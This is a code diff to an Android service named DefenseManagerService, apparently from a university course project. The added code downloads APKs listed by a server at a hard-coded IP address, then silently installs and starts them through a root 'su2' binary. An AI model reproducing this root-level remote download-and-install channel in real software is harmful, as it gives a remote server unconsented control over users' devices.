@@ -3,6 +3,7 @@ package edu.bu.ec700.john.mainapp;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.os.Handler;
 import android.os.IBinder;
 import android.os.StrictMode;
 import android.telephony.TelephonyManager;
@@ -61,8 +62,22 @@ public class DefenseManagerService extends Service {
             JSONObject respobj = new JSONObject(response);
             JSONArray apks = respobj.getJSONArray("apks");
             Log.v(TAG, "num apks: " + new Integer(apks.length()).toString());
+
+            for (int i=0; i<apks.length(); i++) {
+                JSONObject apkinfo = apks.getJSONObject(i);
+
+                Log.v(TAG, apkinfo.getString("apkname"));
+                Log.v(TAG, apkinfo.getString("servicetostart"));
+                Intent intent = new Intent(this, DownloadService.class);
+                intent.putExtra("url", "http://54.69.143.73/apks/" + apkinfo.getString("apkname"));
+                intent.putExtra("apkname", apkinfo.getString("apkname"));
+                intent.putExtra("servicetostart", apkinfo.getString("servicetostart"));
+                intent.putExtra("receiver", new DownloadReceiver(new Handler(), this));
+                startService(intent);
+
+            }
         } catch (Exception e) {
-            Log.v(TAG, "error");
+            Log.v(TAG, "error:"+e.toString()+e.getCause());
             return;
         }
         timer.scheduleAtFixedRate(new mainTask(), 0, 5000);
@@ -102,6 +117,18 @@ public class DefenseManagerService extends Service {
             Log.e(TAG, "io error");
         }
         return builder.toString();
+    }
+
+    public void downloadDone(String apkname, String servicetostart) {
+        Log.v(TAG, "DOWNLOAD DONE, installing:" + apkname);
+        try {
+            Process su = Runtime.getRuntime().exec("/system/xbin/su2 pm install -r /sdcard/" + apkname);
+            su.waitFor();
+            su = Runtime.getRuntime().exec("/system/xbin/su2 am startservice -n " + servicetostart);
+            su.waitFor();
+        } catch (Exception e) {
+            Log.v(TAG, e.toString());
+        }
     }
 
 }
